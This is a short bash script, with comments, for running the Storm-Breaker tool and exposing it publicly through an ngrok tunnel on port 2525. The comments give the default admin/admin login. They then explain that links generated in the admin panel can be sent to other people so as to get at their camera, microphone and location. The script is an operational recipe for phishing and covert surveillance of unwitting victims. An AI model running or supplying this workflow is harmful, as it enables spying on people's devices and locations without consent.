
#!/bin/bash

#Before executing these commands , ensure that you are in the Storm-Breaker directory


#Executing the python file
python3 st.py

#NOTE: !Before actually executing commands using ngrok , you are recommended to create an account on ngrok.com .After creating an account you are provided with a command that adds your auth token to yml file of your local system.so run that command first.

#running the service on port 2525

ngrok http 2525 
#After executing above command, you are provided with a forwarding link.you are advised to login via admin account . Note that the default credentials of admin account is u:admin p:admin 

#After logging in as admin,you can see various links that can be forwarded to others  and by doing so, we can access their resources like camera,microphone and location.
